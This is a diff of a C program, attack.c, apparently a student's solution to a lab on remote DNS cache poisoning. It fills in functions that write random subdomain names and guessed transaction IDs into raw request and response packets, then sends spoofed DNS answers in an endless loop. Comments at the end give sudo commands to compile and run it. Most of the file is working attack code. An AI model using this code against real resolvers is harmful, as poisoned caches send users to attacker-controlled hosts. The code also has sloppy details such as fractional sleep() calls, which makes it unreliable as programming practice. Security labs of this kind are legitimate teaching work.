@@ -55,7 +55,7 @@ int main()
   int n_resp = fread(ip_resp, 1, MAX_FILE_SIZE, f_resp);
 
   char a[26] = "abcdefghijklmnopqrstuvwxyz";
-  for (int temp = 0; temp < 200; temp++)
+  while (1)
   {
     unsigned short transaction_id = 0;
 
@@ -72,42 +72,20 @@ int main()
               This will trigger it to send out DNS queries */
 
     // ... Students should add code here.
-    memcpy(f_req + 41, name, 5);
-    send_raw_packet(ip_req, n_req);
+    send_dns_request(name, ip_req, n_req);
+    sleep(0.65);
 
     // Step 2. Send spoofed responses to the targeted local DNS server.
 
-    // ... Students should add code here
-    //modify the name in the question field(offset = 41)
-    memcpy(ip_resp + 41, name, 5);
-    // modify the name in the answer field(offset = 64)
-    memcpy(ip_resp + 64, name, 5);
-    // modify the IP addr in the src IP field(offset=14) 199.43.135.53->199.43.133.53
-    char c = '\x87';
-    memcpy(ip_resp + 14, &c, 1);
-    while (transaction_id < 400)
+    // ... Students should add code here.
+    for (transaction_id = 1000; transaction_id < 1101; transaction_id++)
     {
-      // modify the transication id field (offset = 28)
-      unsigned short id_net_order;
-      id_net_order = htons(transaction_id);
-      memcpy(ip_resp + 28, &id_net_order, 2);
-      // send out the ip pkt
-      send_raw_packet(ip_resp, n_resp);
-      transaction_id++;
+      send_dns_response(name, transaction_id, ip_resp, n_resp);
+      //send out 100 dns responses (after 100-200 responses, we are too slow and real response already arrived)
     }
-    // modify the IP addr in the src IP field(offset=14) 199.43.133.53->199.43.135.53
-    char c = '\x87';
-    memcpy(ip_resp + 14, &c, 1);
-    for (int id = 1; id < 400; id++)
-    {
-      // modify the transication id field (offset = 28)
-      unsigned short id_net_order;
-      id_net_order = htons(id);
-      memcpy(ip_resp + 28, &id_net_order, 2);
-      // send out the ip pkt
-      send_raw_packet(ip_resp, n_resp);
-    }
-    free(name);
+    //  need to sleep or it will cost too much ram.
+    sleep(0.09);
+
     //##################################################################
   }
 }
@@ -115,17 +93,28 @@ int main()
 /* Use for sending DNS request.
  * Add arguments to the function definition if needed.
  * */
-void send_dns_request()
+void send_dns_request(char *name, unsigned char *ip_req, int n_req)
 {
-  // Students need to implement this function
+
+  memcpy(ip_req + 41, name, 5); //all we gotta do is edit the 5 letter start for xxxxx.exampkle.com (found using blesss)
+
+  send_raw_packet(ip_req, n_req); //send'er out!
 }
 
 /* Use for sending forged DNS response.
  * Add arguments to the function definition if needed.
  * */
-void send_dns_response()
+void send_dns_response(char *name, int tid, unsigned char *ip_resp, int n_resp)
 {
-  // Students need to implement this function
+
+  memcpy(ip_resp + 41, name, 5); //all we gotta do is edit the 5 letter start for xxxxx.exampkle.com (found using blesss)
+  memcpy(ip_resp + 64, name, 5); //all we gotta do is edit the 5 letter start for xxxxx.exampkle.com (found using blesss)
+
+  unsigned short id_net_order = htons(tid); //make the transaction id in little endian binary
+
+  memcpy(ip_resp + 28, &id_net_order, 2); //put the transaction inside payload (always at index 28)
+
+  send_raw_packet(ip_resp, n_resp);
 }
 
 /* Send the raw packet out 
@@ -154,3 +143,9 @@ void send_raw_packet(char *buffer, int pkt_size)
          (struct sockaddr *)&dest_info, sizeof(dest_info));
   close(sock);
 }
+
+//  run command:
+//  sudo chmod a+x genDNSfile.py
+//  sudo python3 genDNSfile.py
+//  sudo gcc attack.c -o attack
+//  sudo ./attack
